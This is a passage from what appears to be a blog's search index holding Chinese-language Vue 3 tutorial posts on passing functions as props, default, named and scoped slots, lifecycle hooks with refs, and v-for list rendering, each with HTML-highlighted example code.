显示子组件传递的数据 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ComponentsB</span> <span class="attr">:onEvent</span>=<span class="string">&quot;dataFn&quot;</span>/&gt;</span>  <span class="comment">&lt;!-- 绑定方法到子组件属性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="四、通信原理图解"><a href="#四、通信原理图解" class="headerlink" title="四、通信原理图解"></a>四、通信原理图解</h2><ul>
<li>父组件通过:绑定方法到子组件属性 onEvent</li>
<li>子组件通过 props 接收这个函数</li>
<li>子组件中调用 onEvent(‘传递数据’) 直接触发父组件方法</li>
<li>父组件的 dataFn 方法被调用，更新 message 数据</li>
<li>模板中的  被更新显示</li>
</ul>
<h2 id="五、关键点说明"><a href="#五、关键点说明" class="headerlink" title="五、关键点说明"></a>五、关键点说明</h2><ul>
<li>父组件通过 props 向子组件传递函数</li>
<li>子组件可以直接在模板中调用这个函数并传递参数</li>
<li>父组件的方法可以直接操作组件状态(message)</li>
<li>这种方式实现了子组件向父组件传值的单向通信</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十五【Vue插槽slot（2）】</title>
    <url>/cnblogs.github.io/p/4bd2.html</url>
    <content><![CDATA[<p><strong>渲染作用域</strong><br>插槽内容可以访问到父组件的数据作用域，因为插槽内容本身是在父组件模板中定义的<br>SlotsTow.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Slots续集<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">SlotsTow</span> <span class="keyword">from</span> <span class="string">&quot;@/components/SlotsTow.vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">SlotsTow</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>: <span class="string">&quot;插槽内容续集&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SlotsTow</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">SlotsTow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>默认内容</strong><br>在外部没有提供任何内容的情况下，可以为插槽指定默认内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Slots续集<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span>插槽默认值<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>具名插槽</strong><br>多个插槽情况下：<br>SlotsTow.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Slots续集<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;header&quot;</span>&gt;</span>插槽默认值<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;main&quot;</span>&gt;</span>插槽默认值<span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SlotsTow</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:header</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-slot:main</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">SlotsTow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>v-slot有对应的简写#，因此<code>&lt;template v-slot:header&gt;</code>可以简写为<code>&lt;template #header&gt;</code>。其意思就是“将这部分模板片段传入子组件的header插槽中</p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十八【Vue生命周期的应用】</title>
    <url>/cnblogs.github.io/p/bab4.html</url>
    <content><![CDATA[<p><strong>生命周期的应用</strong><br>组件的生命周期会随着我们对Vue的了解越多，也会越来越重要，这里我们先讲两个常用的应用常见：</p>
<ul>
<li>通过ref获取元素DOM结构</li>
<li>模拟网络请求渲染数据</li>
</ul>
<p>通过ref获取元素DOM结构</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">name</span>); <span class="comment">// 组件挂载/渲染之前，获取不到</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$refs</span>.<span class="property">name</span>); <span class="comment">// 组件挂载/渲染完毕，获取到了</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>组件生命周期函数应用<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">ref</span>=<span class="string">&quot;name&quot;</span>&gt;</span>程序员<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>模拟网络请求渲染数据</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">banner</span>: []</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">mounted</span>(<span class="params"></span>) &#123; </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 模拟网络请求，组件挂载/渲染完毕，先有组件再有数据好些，所以用mounted()</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">banner</span> =</span></span><br><span class="line"><span class="language-javascript">        [</span></span><br><span class="line"><span class="language-javascript">          &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;title&quot;</span>: <span class="string">&quot;第一届编程大赛&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;contest&quot;</span>: <span class="string">&quot;算法竞赛&quot;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">          &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;title&quot;</span>: <span class="string">&quot;创意设计展&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;contest&quot;</span>: <span class="string">&quot;平面设计比赛&quot;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">          &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;title&quot;</span>: <span class="string">&quot;科技创新奖&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&quot;contest&quot;</span>: <span class="string">&quot;科研项目评选&quot;</span></span></span><br><span class="line"><span class="language-javascript">          &#125;</span></span><br><span class="line"><span class="language-javascript">        ]</span></span><br><span class="line"><span class="language-javascript">    ;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>组件生命周期函数应用<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(item,  index) in banner&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; item.title &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; item.contest &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十六【Vue插槽slot（3）】</title>
    <url>/cnblogs.github.io/p/2f68.html</url>
    <content><![CDATA[<p>在某些场景下插槽的内容可能想要同时使用父组件域内和子组件域内的数据。要做到这一点，我们需要一种方法来让子组件在渲染时将一部分数据提供给插槽。我们也确实有办法这么做！可以像对组件传递props那样，向一个插槽的出口上传递attributes<br>SlotsAttr.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> * 定义一个Vue组件</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> * 该组件包含一个名为childMessage的数据属性，用于传递信息到子组件</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"> */</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化组件的数据属性</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">childMessage</span>: <span class="string">&#x27;子组件数据&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 组件标题 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Slots3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 定义一个插槽，并传递childMessage数据属性给子组件 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">:msg</span>=<span class="string">&quot;childMessage&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 导入SlotsAttr组件，用于展示插槽内容</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">SlotsAttr</span> <span class="keyword">from</span> <span class="string">&quot;@/components/SlotsAttr.vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 定义当前组件的导出对象</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 注册组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">SlotsAttr</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 定义数据属性</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">// 当前测试内容</span></span></span><br><span class="line"><span class="language-javascript">      <span class="attr">currentTest</span>: <span class="string">&quot;测试内容&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 使用SlotsAttr组件，并通过v-slot指令定义默认插槽的内容 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SlotsAttr</span> <span class="attr">v-slot</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 展示来自组件内部的数据 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; currentTest &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 展示来自SlotsAttr组件传递的msg属性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; slotProps.msg &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">SlotsAttr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>具名插槽传递数据</strong><br>SlotsAttr.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 初始化组件的数据属性</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">childMessage</span>: <span class="string">&#x27;具名子组件数据&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">jobMessage</span>: <span class="string">&#x27;程序员&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>Slots3<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;header&quot;</span> <span class="attr">:msg</span>=<span class="string">&quot;childMessage&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span> <span class="attr">name</span>=<span class="string">&quot;main&quot;</span> <span class="attr">:job</span>=<span class="string">&quot;jobMessage&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>App.vue</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">SlotsAttr</span> <span class="keyword">from</span> <span class="string">&quot;@/components/SlotsAttr.vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">SlotsAttr</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SlotsAttr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">header</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>&#123;&#123; slotProps.msg &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> #<span class="attr">main</span>=<span class="string">&quot;slotProps&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; slotProps.job &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">SlotsAttr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结二十四【Vue插槽slot（1）】</title>
    <url>/cnblogs.github.io/p/917d.html</url>
    <content><![CDATA[<p>插槽是 Vue 中组件内容分发的机制，允许你在父组件中向子组件传递任意 HTML 内容。</p>
<h3 id="子组件：SlotsBase-vue"><a href="#子组件：SlotsBase-vue" class="headerlink" title="子组件：SlotsBase.vue"></a>子组件：SlotsBase.vue</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span>&gt;</span>插槽基础知识<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span> <span class="comment">&lt;!-- 插槽出口 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>&lt;slot&gt;&lt;/slot&gt;</code> 是一个插槽出口，表示在使用该组件时可以插入自定义内容。</li>
<li>在这个例子中，我们定义了一个标题 “插槽基础知识”，下方是一个默认插槽。</li>
</ul>
<h3 id="父组件：App-vue"><a href="#父组件：App-vue" class="headerlink" title="父组件：App.vue"></a>父组件：App.vue</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">SlotsBase</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h3</span>&gt;</span>插槽标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>插槽内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">SlotsBase</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> <span class="title class_">SlotsBase</span> <span class="keyword">from</span> <span class="string">&quot;@/components/SlotsBase.vue&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">components</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">SlotsBase</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们在 App.vue中引入并使用了 SlotsBase 组件。使用方式 <code>&lt;SlotsBase&gt;...&lt;/SlotsBase&gt;</code> 标签之间的内容会替换掉子组件中的 <code>&lt;slot&gt;&lt;/slot&gt;</code>。</p>
<p><strong>总结</strong></p>
<ul>
<li>子组件通过 <code>&lt;slot&gt;&lt;/slot&gt;</code> 定义插槽入口。</li>
<li>父组件在使用子组件时，在其标签内部写入内容即可传入插槽。</li>
<li>插槽内容支持任何 HTML 元素和结构。<br><code>&lt;slot&gt;</code>元素是一个插槽出口(slotoutlet)，标示了父元素提供的插槽内容(slotcontent)将在哪里被渲染</li>
</ul>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3总结五【Vue模板语法-列表渲染】</title>
    <url>/cnblogs.github.io/p/c81c.html</url>
    <content><![CDATA[<p><strong>基本写法</strong><br>我们可以使用 v-for 指令基于一个数组来渲染一个列表。 v-for 指令的值需要使用 item in items 形式的特殊语法其中 items 是源数据的数组，而 item 是迭代项的别名</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>列表渲染<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;item in names&quot;</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>复杂数据</strong><br>大多数情况，我们渲染的数据源来源于网络请求，也就是 JSON格式</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">names</span>:[<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>],</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">books</span>:[&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;id&quot;</span>:<span class="number">25739</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;title&quot;</span>:<span class="string">&quot;将进酒·君不见黄河之水天上来&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="string">&quot;img&quot;</span>:<span class="string">&quot;https://img.shicimingju.com/pics/item/25739.jpg&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span 